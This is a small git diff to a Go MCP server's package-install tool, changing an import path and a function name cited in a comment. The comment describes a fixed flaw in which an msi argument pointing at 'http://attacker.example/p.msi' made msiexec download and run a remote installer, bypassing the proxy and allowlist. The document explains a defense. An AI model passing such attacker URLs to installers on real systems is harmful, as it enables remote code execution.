@@ -13,7 +13,7 @@ import (
 	"github.com/google/jsonschema-go/jsonschema"
 	"github.com/modelcontextprotocol/go-sdk/mcp"
 
-	"github.com/deploymenttheory/windows-mcp-server/pkg/inventory"
+	"github.com/deploymenttheory/mcp-server-core/inventory"
 )
 
 // packageTimeout bounds an install/uninstall: they download and run installers,
@@ -139,7 +139,7 @@ func packageCommand(mode string, args map[string]any) (string, time.Duration, er
 // The only check was a ".msi" suffix, and msiexec /i happily accepts a URL or a
 // UNC path — so msi: "http://attacker.example/p.msi" downloaded and executed an
 // installer over plaintext HTTP, outside the egress proxy and the allowlist, and
-// never passed through enforceHTTPSScheme. The schema and description both say
+// never passed through toolkit.EnforceHTTPSScheme. The schema and description both say
 // "local .msi by path", so the documented disclosure that installs reach the
 // network did not cover an operator-unexpected fetch of an arbitrary URL.
 func requireLocalMSI(msi string) error {
